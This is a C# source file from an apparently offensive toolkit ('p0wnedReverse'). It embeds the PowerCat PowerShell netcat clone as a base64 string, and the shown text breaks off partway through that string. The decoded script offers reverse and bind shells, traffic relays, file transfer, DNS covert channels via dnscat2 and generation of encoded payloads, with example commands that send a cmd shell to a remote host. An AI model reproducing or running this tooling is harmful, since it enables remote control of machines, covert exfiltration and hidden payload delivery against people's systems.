namespace p0wnedReverse
{
    class Resources
    {
        public static string PowerCat()
        {
            string PSPowerCat = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gcG93ZXJjYXQNCnsNCiAgcGFyYW0oDQogICAgW2FsaWFzKCJDbGllbnQiKV1bc3RyaW5nXSRjPSIiLA0KICAgIFthbGlhcygiTGlzdGVuIildW3N3aXRjaF0kbD0kRmFsc2UsDQogICAgW2FsaWFzKCJQb3J0IildW1BhcmFtZXRlcihQb3NpdGlvbj0tMSldW3N0cmluZ10kcD0iIiwNCiAgICBbYWxpYXMoIkV4ZWN1dGUiKV1bc3RyaW5nXSRlPSIiLA0KICAgIFthbGlhcygiRXhlY3V0ZVBvd2Vyc2hlbGwiKV1bc3dpdGNoXSRlcD0kRmFsc2UsDQogICAgW2FsaWFzKCJSZWxheSIpXVtzdHJpbmddJHI9IiIsDQogICAgW2FsaWFzKCJVRFAiKV1bc3dpdGNoXSR1PSRGYWxzZSwNCiAgICBbYWxpYXMoImRuc2NhdDIiKV1bc3RyaW5nXSRkbnM9IiIsDQogICAgW2FsaWFzKCJETlNGYWlsdXJlVGhyZXNob2xkIildW2ludDMyXSRkbnNmdD0xMCwNCiAgICBbYWxpYXMoIlRpbWVvdXQiKV1baW50MzJdJHQ9NjAsDQogICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldW2FsaWFzKCJJbnB1dCIpXSRpPSRudWxsLA0KICAgIFtWYWxpZGF0ZVNldCgnSG9zdCcsICdCeXRlcycsICdTdHJpbmcnKV1bYWxpYXMoIk91dHB1dFR5cGUiKV1bc3RyaW5nXSRvPSJIb3N0IiwNCiAgICBbYWxpYXMoIk91dHB1dEZpbGUiKV1bc3RyaW5nXSRvZj0iIiwNCiAgICBbYWxpYXMoIkRpc2Nvbm5lY3QiKV1bc3dpdGNoXSRkPSRGYWxzZSwNCiAgICBbYWxpYXMoIlJlcGVhdGVyIildW3N3aXRjaF0kcmVwPSRGYWxzZSwNCiAgICBbYWxpYXMoIkdlbmVyYXRlUGF5bG9hZCIpXVtzd2l0Y2hdJGc9JEZhbHNlLA0KICAgIFthbGlhcygiR2VuZXJhdGVFbmNvZGVkIildW3N3aXRjaF0kZ2U9JEZhbHNlLA0KICAgIFthbGlhcygiSGVscCIpXVtzd2l0Y2hdJGg9JEZhbHNlDQogICkNCiAgDQogICMjIyMjIyMjIyMjIyMjIyBIRUxQICMjIyMjIyMjIyMjIyMjIw0KICAkSGVscCA9ICINCnBvd2VyY2F0IC0gTmV0Y2F0LCBUaGUgUG93ZXJzaGVsbCBWZXJzaW9uDQpHaXRodWIgUmVwb3NpdG9yeTogaHR0cHM6Ly9naXRodWIuY29tL2Jlc2ltb3JoaW5vL3Bvd2VyY2F0DQoNClRoaXMgc2NyaXB0IGF0dGVtcHRzIHRvIGltcGxlbWVudCB0aGUgZmVhdHVyZXMgb2YgbmV0Y2F0IGluIGEgcG93ZXJzaGVsbA0Kc2NyaXB0LiBJdCBhbHNvIGNvbnRhaW5zIGV4dHJhIGZlYXR1cmVzIHN1Y2ggYXMgYnVpbHQtaW4gcmVsYXlzLCBleGVjdXRlDQpwb3dlcnNoZWxsLCBhbmQgYSBkbnNjYXQyIGNsaWVudC4NCg0KVXNhZ2U6IHBvd2VyY2F0IFstYyBvciAtbF0gWy1wIHBvcnRdIFtvcHRpb25zXQ0KDQogIC1jICA8aXA+ICAgICAgICBDbGllbnQgTW9kZS4gUHJvdmlkZSB0aGUgSVAgb2YgdGhlIHN5c3RlbSB5b3Ugd2lzaCB0byBjb25uZWN0IHRvLg0KICAgICAgICAgICAgICAgICAgSWYgeW91IGFyZSB1c2luZyAtZG5zLCBzcGVjaWZ5IHRoZSBETlMgU2VydmVyIHRvIHNlbmQgcXVlcmllcyB0by4NCiAgICAgICAgICAgIA0KICAtbCAgICAgICAgICAgICAgTGlzdGVuIE1vZGUuIFN0YXJ0IGEgbGlzdGVuZXIgb24gdGhlIHBvcnQgc3BlY2lmaWVkIGJ5IC1wLg0KICANCiAgLXAgIDxwb3J0PiAgICAgIFBvcnQuIFRoZSBwb3J0IHRvIGNvbm5lY3QgdG8sIG9yIHRoZSBwb3J0IHRvIGxpc3RlbiBvbi4NCiAgDQogIC1lICA8cHJvYz4gICAgICBFeGVjdXRlLiBTcGVjaWZ5IHRoZSBuYW1lIG9mIHRoZSBwcm9jZXNzIHRvIHN0YXJ0Lg0KICANCiAgLWVwICAgICAgICAgICAgIEV4ZWN1dGUgUG93ZXJzaGVsbC4gU3RhcnQgYSBwc2V1ZG8gcG93ZXJzaGVsbCBzZXNzaW9uLiBZb3UgY2FuDQogICAgICAgICAgICAgICAgICBkZWNsYXJlIHZhcmlhYmxlcyBhbmQgZXhlY3V0ZSBjb21tYW5kcywgYnV0IGlmIHlvdSB0cnkgdG8gZW50ZXINCiAgICAgICAgICAgICAgICAgIGFub3RoZXIgc2hlbGwgKG5zbG9va3VwLCBuZXRzaCwgY21kLCBldGMuKSB0aGUgc2hlbGwgd2lsbCBoYW5nLg0KICAgICAgICAgICAgDQogIC1yICA8c3RyPiAgICAgICBSZWxheS4gVXNlZCBmb3IgcmVsYXlpbmcgbmV0d29yayB0cmFmZmljIGJldHdlZW4gdHdvIG5vZGVzLg0KICAgICAgICAgICAgICAgICAgQ2xpZW50IFJlbGF5IEZvcm1hdDogICAtciA8cHJvdG9jb2w+OjxpcCBhZGRyPjo8cG9ydD4NCiAgICAgICAgICAgICAgICAgIExpc3RlbmVyIFJlbGF5IEZvcm1hdDogLXIgPHByb3RvY29sPjo8cG9ydD4NCiAgICAgICAgICAgICAgICAgIEROU0NhdDIgUmVsYXkgRm9ybWF0OiAgLXIgZG5zOjxkbnMgc2VydmVyPjo8ZG5zIHBvcnQ+Ojxkb21haW4+DQogICAgICAgICAgICANCiAgLXUgICAgICAgICAgICAgIFVEUCBNb2RlLiBTZW5kIHRyYWZmaWMgb3ZlciBVRFAuIEJlY2F1c2UgaXQncyBVRFAsIHRoZSBjbGllbnQNCiAgICAgICAgICAgICAgICAgIG11c3Qgc2VuZCBkYXRhIGJlZm9yZSB0aGUgc2VydmVyIGNhbiByZXNwb25kLg0KICAgICAgICAgICAgDQogIC1kbnMgIDxkb21haW4+ICBETlMgTW9kZS4gU2VuZCB0cmFmZmljIG92ZXIgdGhlIGRuc2NhdDIgZG5zIGNvdmVydCBjaGFubmVsLg0KICAgICAgICAgICAgICAgICAgU3BlY2lmeSB0aGUgZG5zIHNlcnZlciB0byAtYywgdGhlIGRucyBwb3J0IHRvIC1wLCBhbmQgc3BlY2lmeSB0aGUgDQogICAgICAgICAgICAgICAgICBkb21haW4gdG8gdGhpcyBvcHRpb24sIC1kbnMuIFRoaXMgaXMgb25seSBhIGNsaWVudC4NCiAgICAgICAgICAgICAgICAgIEdldCB0aGUgc2VydmVyIGhlcmU6IGh0dHBzOi8vZ2l0aHViLmNvbS9pYWdveDg2L2Ruc2NhdDINCiAgICAgICAgICAgIA0KICAtZG5zZnQgPGludD4gICAgRE5TIEZhaWx1cmUgVGhyZXNob2xkLiBUaGlzIGlzIGhvdyBtYW55IGJhZCBwYWNrZXRzIHRoZSBjbGllbnQgY2FuDQogICAgICAgICAgICAgICAgICByZWNpZXZlIGJlZm9yZSBleGl0aW5nLiBTZXQgdG8gemVybyB3aGVuIHJlY2VpdmluZyBmaWxlcywgYW5kIHNldCBoaWdoDQogICAgICAgICAgICAgICAgICBmb3IgbW9yZSBzdGFiaWxpdHkgb3ZlciB0aGUgaW50ZXJuZXQuDQogICAgICAgICAgICANCiAgLXQgIDxpbnQ+ICAgICAgIFRpbWVvdXQuIFRoZSBudW1iZXIgb2Ygc2Vjb25kcyB0byB3YWl0IGJlZm9yZSBnaXZpbmcgdXAgb24gbGlzdGVuaW5nIG9yDQogICAgICAgICAgICAgICAgICBjb25uZWN0aW5nLiBEZWZhdWx0OiA2MA0KICAgICAgICAgICAgDQogIC1pICA8aW5wdXQ+ICAgICBJbnB1dC4gUHJvdmlkZSBkYXRhIHRvIGJlIHNlbnQgZG93biB0aGUgcGlwZSBhcyBzb29uIGFzIGEgY29ubmVjdGlvbiBpcw0KICAgICAgICAgICAgICAgICAgZXN0YWJsaXNoZWQuIFVzZWQgZm9yIG1vdmluZyBmaWxlcy4gWW91IGNhbiBwcm92aWRlIHRoZSBwYXRoIHRvIGEgZmlsZSwNCiAgICAgICAgICAgICAgICAgIGEgYnl0ZSBhcnJheSBvYmplY3QsIG9yIGEgc3RyaW5nLiBZb3UgY2FuIGFsc28gcGlwZSBhbnkgb2YgdGhvc2UgaW50bw0KICAgICAgICAgICAgICAgICAgcG93ZXJjYXQsIGxpa2UgJ2FhYWFhYScgfCBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA4MA0KICAgICAgICAgICAgDQogIC1vICA8dHlwZT4gICAgICBPdXRwdXQuIFNwZWNpZnkgaG93IHBvd2VyY2F0IHNob3VsZCByZXR1cm4gaW5mb3JtYXRpb24gdG8gdGhlIGNvbnNvbGUuDQogICAgICAgICAgICAgICAgICBWYWxpZCBvcHRpb25zIGFyZSAnQnl0ZXMnLCAnU3RyaW5nJywgb3IgJ0hvc3QnLiBEZWZhdWx0IGlzICdIb3N0Jy4NCiAgICAgICAgICAgIA0KICAtb2YgPHBhdGg+ICAgICAgT3V0cHV0IEZpbGUuICBTcGVjaWZ5IHRoZSBwYXRoIHRvIGEgZmlsZSB0byB3cml0ZSBvdXRwdXQgdG8uDQogICAgICAgICAgICANCiAgLWQgICAgICAgICAgICAgIERpc2Nvbm5lY3QuIHBvd2VyY2F0IHdpbGwgZGlzY29ubmVjdCBhZnRlciB0aGUgY29ubmVjdGlvbiBpcyBlc3RhYmxpc2hlZA0KICAgICAgICAgICAgICAgICAgYW5kIHRoZSBpbnB1dCBmcm9tIC1pIGlzIHNlbnQuIFVzZWQgZm9yIHNjYW5uaW5nLg0KICAgICAgICAgICAgDQogIC1yZXAgICAgICAgICAgICBSZXBlYXRlci4gcG93ZXJjYXQgd2lsbCBjb250aW51YWxseSByZXN0YXJ0IGFmdGVyIGl0IGlzIGRpc2Nvbm5lY3RlZC4NCiAgICAgICAgICAgICAgICAgIFVzZWQgZm9yIHNldHRpbmcgdXAgYSBwZXJzaXN0ZW50IHNlcnZlci4NCiAgICAgICAgICAgICAgICAgIA0KICAtZyAgICAgICAgICAgICAgR2VuZXJhdGUgUGF5bG9hZC4gIFJldHVybnMgYSBzY3JpcHQgYXMgYSBzdHJpbmcgd2hpY2ggd2lsbCBleGVjdXRlIHRoZQ0KICAgICAgICAgICAgICAgICAgcG93ZXJjYXQgd2l0aCB0aGUgb3B0aW9ucyB5b3UgaGF2ZSBzcGVjaWZpZWQuIC1pLCAtZCwgYW5kIC1yZXAgd2lsbCBub3QNCiAgICAgICAgICAgICAgICAgIGJlIGluY29ycG9yYXRlZC4NCiAgICAgICAgICAgICAgICAgIA0KICAtZ2UgICAgICAgICAgICAgR2VuZXJhdGUgRW5jb2RlZCBQYXlsb2FkLiBEb2VzIHRoZSBzYW1lIGFzIC1nLCBidXQgcmV0dXJucyBhIHN0cmluZyB3aGljaA0KICAgICAgICAgICAgICAgICAgY2FuIGJlIGV4ZWN1dGVkIGluIHRoaXMgd2F5OiBwb3dlcnNoZWxsIC1FIDxlbmNvZGVkIHN0cmluZz4NCg0KICAtaCAgICAgICAgICAgICAgUHJpbnQgdGhpcyBoZWxwIG1lc3NhZ2UuDQoNCkV4YW1wbGVzOg0KDQogIExpc3RlbiBvbiBwb3J0IDgwMDAgYW5kIHByaW50IHRoZSBvdXRwdXQgdG8gdGhlIGNvbnNvbGUuDQogICAgICBwb3dlcmNhdCAtbCAtcCA4MDAwDQogIA0KICBDb25uZWN0IHRvIDEwLjEuMS4xIHBvcnQgNDQzLCBzZW5kIGEgc2hlbGwsIGFuZCBlbmFibGUgdmVyYm9zaXR5Lg0KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjEgLXAgNDQzIC1lIGNtZCAtdg0KICANCiAgQ29ubmVjdCB0byB0aGUgZG5zY2F0MiBzZXJ2ZXIgb24gYzIuZXhhbXBsZS5jb20sIGFuZCBzZW5kIGRucyBxdWVyaWVzDQogIHRvIHRoZSBkbnMgc2VydmVyIG9uIDEwLjEuMS4xIHBvcnQgNTMuDQogICAgICBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA1MyAtZG5zIGMyLmV4YW1wbGUuY29tDQogIA0KICBTZW5kIGEgZmlsZSB0byAxMC4xLjEuMTUgcG9ydCA4MDAwLg0KICAgICAgcG93ZXJjYXQgLWMgMTAuMS4xLjE1IC1wIDgwMDAgLWkgQzpcaW5wdXRmaWxlDQogIA0KICBXcml0ZSB0aGUgZGF0YSBzZW50IHRvIHRoZSBsb2NhbCBsaXN0ZW5lciBvbiBwb3J0IDQ0NDQgdG8gQzpcb3V0ZmlsZQ0KICAgICAgcG93ZXJjYXQgLWwgLXAgNDQ0NCAtb2YgQzpcb3V0ZmlsZQ0KICANCiAgTGlzdGVuIG9uIHBvcnQgODAwMCBhbmQgcmVwZWF0ZWRseSBzZXJ2ZXIgYSBwb3dlcnNoZWxsIHNoZWxsLg0KICAgICAgcG93ZXJjYXQgLWwgLXAgODAwMCAtZXAgLXJlcA0KICANCiAgUmVsYXkgdHJhZmZpYyBjb21pbmcgaW4gb24gcG9ydCA4MDAwIG92ZXIgdGNwIHRvIHBvcnQgOTAwMCBvbiAxMC4xLjEuMSBvdmVyIHRjcC4NCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgdGNwOjEwLjEuMS4xOjkwMDANCiAgICAgIA0KICBSZWxheSB0cmFmZmljIGNvbWluZyBpbiBvbiBwb3J0IDgwMDAgb3ZlciB0Y3AgdG8gdGhlIGRuc2NhdDIgc2VydmVyIG9uIGMyLmV4YW1wbGUuY29tLA0KICBzZW5kaW5nIHF1ZXJpZXMgdG8gMTAuMS4xLjEgcG9ydCA1My4NCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAgLXIgZG5zOjEwLjEuMS4xOjUzOmMyLmV4YW1wbGUuY29tDQoiDQogIGlmKCRoKXtyZXR1cm4gJEhlbHB9DQogICMjIyMjIyMjIyMjIyMjIyBIRUxQICMjIyMjIyMjIyMjIyMjIw0KICANCiAgIyMjIyMjIyMjIyMjIyMjIFZBTElEQVRFIEFSR1MgIyMjIyMjIyMjIyMjIyMjDQogICRnbG9iYWw6VmVyYm9zZSA9ICRWZXJib3NlDQogIGlmKCRvZiAtbmUgJycpeyRvID0gJ0J5dGVzJ30NCiAgaWYoJGRucyAtZXEgIiIpDQogIHsNCiAgICBpZigoKCRjIC1lcSAiIikgLWFuZCAoISRsKSkgLW9yICgoJGMgLW5lICIiKSAtYW5kICRsKSl7cmV0dXJuICJZb3UgbXVzdCBzZWxlY3QgZWl0aGVyIGNsaWVudCBtb2RlICgtYykgb3IgbGlzdGVuIG1vZGUgKC1sKS4ifQ0KICAgIGlmKCRwIC1lcSAiIil7cmV0dXJuICJQbGVhc2UgcHJvdmlkZSBhIHBvcnQgbnVtYmVyIHRvIC1wLiJ9DQogIH0NCiAgaWYoKCgoJHIgLW5lICIiKSAtYW5kICgkZSAtbmUgIiIpKSAtb3IgKCgkZSAtbmUgIiIpIC1hbmQgKCRlcCkpKSAtb3IgICgoJHIgLW5lICIiKSAtYW5kICgkZXApKSl7cmV0dXJuICJZb3UgY2FuIG9ubHkgcGljayBvbmUgb2YgdGhlc2U6IC1lLCAtZXAsIC1yIn0NCiAgaWYoKCRpIC1uZSAkbnVsbCkgLWFuZCAoKCRyIC1uZSAiIikgLW9yICgkZSAtbmUgIiIpKSl7cmV0dXJuICItaSBpcyBub3QgYXBwbGljYWJsZSBoZXJlLiJ9DQogIGlmKCRsKQ0KICB7DQogICAgJEZhaWx1cmUgPSAkRmFsc2UNCiAgICBuZXRzdGF0IC1uYSB8IFNlbGVjdC1TdHJpbmcgTElTVEVOSU5HIHwgJSB7aWYoKCRfLlRvU3RyaW5nKCkuc3BsaXQoIjoiKVsxXS5zcGxpdCgiICIpWzBdKSAtZXEgJHApe1dyaXRlLU91dHB1dCAoIlRoZSBzZWxlY3RlZCBwb3J0ICIgKyAkcCArICIgaXMgYWxyZWFkeSBpbiB1c2UuIikgOyAkRmFpbHVyZT0kVHJ1ZX19DQogICAgaWYoJEZhaWx1cmUpe2JyZWFrfQ0KICB9DQogIGlmKCRyIC1uZSAiIikNCiAgew0KICAgIGlmKCRyLnNwbGl0KCI6IikuQ291bnQgLWVxIDIpDQogICAgew0KICAgICAgJEZhaWx1cmUgPSAkRmFsc2UNCiAgICAgIG5ldHN0YXQgLW5hIHwgU2VsZWN0LVN0cmluZyBMSVNURU5JTkcgfCAlIHtpZigoJF8uVG9TdHJpbmcoKS5zcGxpdCgiOiIpWzFdLnNwbGl0KCIgIilbMF0pIC1lcSAkci5zcGxpdCgiOiIpWzFdKXtXcml0ZS1PdXRwdXQgKCJUaGUgc2VsZWN0ZWQgcG9ydCAiICsgJHIuc3BsaXQoIjoiKVsxXSArICIgaXMgYWxyZWFkeSBpbiB1c2UuIikgOyAkRmFpbHVyZT0kVHJ1ZX19DQogICAgICBpZigkRmFpbHVyZSl7YnJlYWt9DQogICAgfQ0KICB9DQogICMjIyMjIyMjIyMjIyMjIyBWQUxJREFURSBBUkdTICMjIyMjIyMjIyMjIyMjIw0KICANCiAgIyMjIyMjIyMjIyMjIyMjIFVEUCBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIFNldHVwX1VEUA0KICB7DQogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpDQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQ0KICAgICRjLCRsLCRwLCR0ID0gJEZ1bmNTZXR1cFZhcnMNCiAgICAkRnVuY1ZhcnMgPSBAe30NCiAgICAkRnVuY1ZhcnNbIkVuY29kaW5nIl0gPSBOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFzY2lpRW5jb2RpbmcNCiAgICBpZigkbCkNCiAgICB7DQogICAgICAkU29ja2V0RGVzdGluYXRpb25CdWZmZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gNjU1MzYNCiAgICAgICRFbmRQb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50IChbU3lzdGVtLk5ldC5JUEFkZHJlc3NdOjpBbnkpLCAkcA0KICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlVEUENsaWVudCAkcA0KICAgICAgJFBhY2tldEluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5JUFBhY2tldEluZm9ybWF0aW9uDQogICAgICBXcml0ZS1WZXJib3NlICgiTGlzdGVuaW5nIG9uIFswLjAuMC4wXSBwb3J0ICIgKyAkcCArICIgW3VkcF0iKQ0KICAgICAgJENvbm5lY3RIYW5kbGUgPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5CZWdpblJlY2VpdmVNZXNzYWdlRnJvbSgkU29ja2V0RGVzdGluYXRpb25CdWZmZXIsMCw2NTUzNixbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSxbcmVmXSRFbmRQb2ludCwkbnVsbCwkbnVsbCkNCiAgICAgICRTdG9wd2F0Y2ggPSBbU3lzdGVtLkRpYWdub3N0aWNzLlN0b3B3YXRjaF06OlN0YXJ0TmV3KCkNCiAgICAgIHdoaWxlKCRUcnVlKQ0KICAgICAgew0KICAgICAgICBpZigkSG9zdC5VSS5SYXdVSS5LZXlBdmFpbGFibGUpDQogICAgICAgIHsNCiAgICAgICAgICBpZihAKDE3LDI3KSAtY29udGFpbnMgKCRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoIk5vRWNobyxJbmNsdWRlS2V5RG93biIpLlZpcnR1YWxLZXlDb2RlKSkNCiAgICAgICAgICB7DQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDVFJMIG9yIEVTQyBjYXVnaHQuIFN0b3BwaW5nIFVEUCBTZXR1cC4uLiINCiAgICAgICAgICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQ0KICAgICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGlmKCRTdG9wd2F0Y2guRWxhcHNlZC5Ub3RhbFNlY29uZHMgLWd0ICR0KQ0KICAgICAgICB7DQogICAgICAgICAgJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbG9zZSgpDQogICAgICAgICAgJFN0b3B3YXRjaC5TdG9wKCkNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICJUaW1lb3V0ISIgOyBicmVhaw0KICAgICAgICB9DQogICAgICAgIGlmKCRDb25uZWN0SGFuZGxlLklzQ29tcGxldGVkKQ0KICAgICAgICB7DQogICAgICAgICAgJFNvY2tldEJ5dGVzUmVhZCA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkVuZFJlY2VpdmVNZXNzYWdlRnJvbSgkQ29ubmVjdEhhbmRsZSxbcmVmXShbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSksW3JlZl0kRW5kUG9pbnQsW3JlZl0kUGFja2V0SW5mbykNCiAgICAgICAgICBXcml0ZS1WZXJib3NlICgiQ29ubmVjdGlvbiBmcm9tIFsiICsgJEVuZFBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcgKyAiXSBwb3J0ICIgKyAkcCArICIgW3VkcF0gYWNjZXB0ZWQgKHNvdXJjZSBwb3J0ICIgKyAkRW5kUG9pbnQuUG9ydCArICIpIikNCiAgICAgICAgICBpZigkU29ja2V0Qnl0ZXNSZWFkIC1ndCAwKXticmVha30NCiAgICAgICAgICBlbHNle2JyZWFrfQ0KICAgICAgICB9DQogICAgICB9DQogICAgICAkU3RvcHdhdGNoLlN0b3AoKQ0KICAgICAgJEZ1bmNWYXJzWyJJbml0aWFsQ29ubmVjdGlvbkJ5dGVzIl0gPSAkU29ja2V0RGVzdGluYXRpb25CdWZmZXJbMC4uKFtpbnRdJFNvY2tldEJ5dGVzUmVhZC0xKV0NCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgIGlmKCEkYy5Db250YWlucygiLiIpKQ0KICAgICAgew0KICAgICAgICAkSVBMaXN0ID0gQCgpDQogICAgICAgIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoJGMpIHwgV2hlcmUtT2JqZWN0IHskXy5BZGRyZXNzRmFtaWx5IC1lcSAiSW50ZXJOZXR3b3JrIn0gfCAleyRJUExpc3QgKz0gJF8uSVBBZGRyZXNzVG9TdHJpbmd9DQogICAgICAgIFdyaXRlLVZlcmJvc2UgKCJOYW1lICIgKyAkYyArICIgcmVzb2x2ZWQgdG8gYWRkcmVzcyAiICsgJElQTGlzdFswXSkNCiAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRJUExpc3RbMF0pKSwgJHANCiAgICAgIH0NCiAgICAgIGVsc2UNCiAgICAgIHsNCiAgICAgICAgJEVuZFBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kUG9pbnQgKFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRjKSksICRwDQogICAgICB9DQogICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVURQQ2xpZW50DQogICAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNvbm5lY3QoJGMsJHApDQogICAgICBXcml0ZS1WZXJib3NlICgiU2VuZGluZyBVRFAgdHJhZmZpYyB0byAiICsgJGMgKyAiIHBvcnQgIiArICRwICsgIi4uLiIpDQogICAgICBXcml0ZS1WZXJib3NlICgiVURQOiBNYWtlIHN1cmUgdG8gc2VuZCBzb21lIGRhdGEgc28gdGhlIHNlcnZlciBjYW4gbm90aWNlIHlvdSEiKQ0KICAgIH0NCiAgICAkRnVuY1ZhcnNbIkJ1ZmZlclNpemUiXSA9IDY1NTM2DQogICAgJEZ1bmNWYXJzWyJFbmRQb2ludCJdID0gJEVuZFBvaW50DQogICAgJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdID0gTmV3LU9iamVjdCBTeXN0ZW0uQnl0ZVtdICRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdDQogICAgJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5CZWdpblJlY2VpdmVGcm9tKCRGdW5jVmFyc1siU3RyZWFtRGVzdGluYXRpb25CdWZmZXIiXSwwLCRGdW5jVmFyc1siQnVmZmVyU2l6ZSJdLChbU3lzdGVtLk5ldC5Tb2NrZXRzLlNvY2tldEZsYWdzXTo6Tm9uZSksW3JlZl0kRnVuY1ZhcnNbIkVuZFBvaW50Il0sJG51bGwsJG51bGwpDQogICAgcmV0dXJuICRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFJlYWREYXRhX1VEUA0KICB7DQogICAgcGFyYW0oJEZ1bmNWYXJzKQ0KICAgICREYXRhID0gJG51bGwNCiAgICBpZigkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkNCiAgICB7DQogICAgICAkU3RyZWFtQnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJTb2NrZXQiXS5DbGllbnQuRW5kUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1SZWFkT3BlcmF0aW9uIl0sW3JlZl0kRnVuY1ZhcnNbIkVuZFBvaW50Il0pDQogICAgICBpZigkU3RyZWFtQnl0ZXNSZWFkIC1lcSAwKXticmVha30NCiAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdHJlYW1CeXRlc1JlYWQtMSldDQogICAgICAkRnVuY1ZhcnNbIlN0cmVhbVJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siU29ja2V0Il0uQ2xpZW50LkJlZ2luUmVjZWl2ZUZyb20oJEZ1bmNWYXJzWyJTdHJlYW1EZXN0aW5hdGlvbkJ1ZmZlciJdLDAsJEZ1bmNWYXJzWyJCdWZmZXJTaXplIl0sKFtTeXN0ZW0uTmV0LlNvY2tldHMuU29ja2V0RmxhZ3NdOjpOb25lKSxbcmVmXSRGdW5jVmFyc1siRW5kUG9pbnQiXSwkbnVsbCwkbnVsbCkNCiAgICB9DQogICAgcmV0dXJuICREYXRhLCRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIFdyaXRlRGF0YV9VRFANCiAgew0KICAgIHBhcmFtKCREYXRhLCRGdW5jVmFycykNCiAgICAkRnVuY1ZhcnNbIlNvY2tldCJdLkNsaWVudC5TZW5kVG8oJERhdGEsJEZ1bmNWYXJzWyJFbmRQb2ludCJdKSB8IE91dC1OdWxsDQogICAgcmV0dXJuICRGdW5jVmFycw0KICB9DQogIGZ1bmN0aW9uIENsb3NlX1VEUA0KICB7DQogICAgcGFyYW0oJEZ1bmNWYXJzKQ0KICAgICRGdW5jVmFyc1siU29ja2V0Il0uQ2xvc2UoKQ0KICB9DQogICMjIyMjIyMjIyMjIyMjIyBVRFAgRlVOQ1RJT05TICMjIyMjIyMjIyMjIyMjIw0KICANCiAgIyMjIyMjIyMjIyMjIyMjIEROUyBGVU5DVElPTlMgIyMjIyMjIyMjIyMjIyMjDQogIGZ1bmN0aW9uIFNldHVwX0ROUw0KICB7DQogICAgcGFyYW0oJEZ1bmNTZXR1cFZhcnMpDQogICAgaWYoJGdsb2JhbDpWZXJib3NlKXskVmVyYm9zZSA9ICRUcnVlfQ0KICAgIGZ1bmN0aW9uIENvbnZlcnRUby1IZXhBcnJheQ0KICAgIHsNCiAgICAgIHBhcmFtKCRTdHJpbmcpDQogICAgICAkSGV4ID0gQCgpDQogICAgICAkU3RyaW5nLlRvQ2hhckFycmF5KCkgfCAlIHsiezA6eH0iIC1mIFtieXRlXSRffSB8ICUge2lmKCRfLkxlbmd0aCAtZXEgMSl7IjAiICsgW3N0cmluZ10kX30gZWxzZXtbc3RyaW5nXSRffX0gfCAlIHskSGV4ICs9ICRffQ0KICAgICAgcmV0dXJuICRIZXgNCiAgICB9DQogICAgDQogICAgZnVuY3Rpb24gU2VuZFBhY2tldA0KICAgIHsNCiAgICAgIHBhcmFtKCRQYWNrZXQsJEROU1NlcnZlciwkRE5TUG9ydCkNCiAgICAgICRDb21tYW5kID0gKCJzZXQgdHlwZT1UWFRgbnNlcnZlciAkRE5TU2VydmVyYG5zZXQgcG9ydD0kRE5TUG9ydGBuc2V0IGRvbWFpbj0uY29tYG5zZXQgcmV0cnk9MWBuIiArICRQYWNrZXQgKyAiYG5leGl0IikNCiAgICAgICRyZXN1bHQgPSAoJENvbW1hbmQgfCBuc2xvb2t1cCAyPiYxIHwgT3V0LVN0cmluZykNCiAgICAgIGlmKCRyZXN1bHQuQ29udGFpbnMoJyInKSl7cmV0dX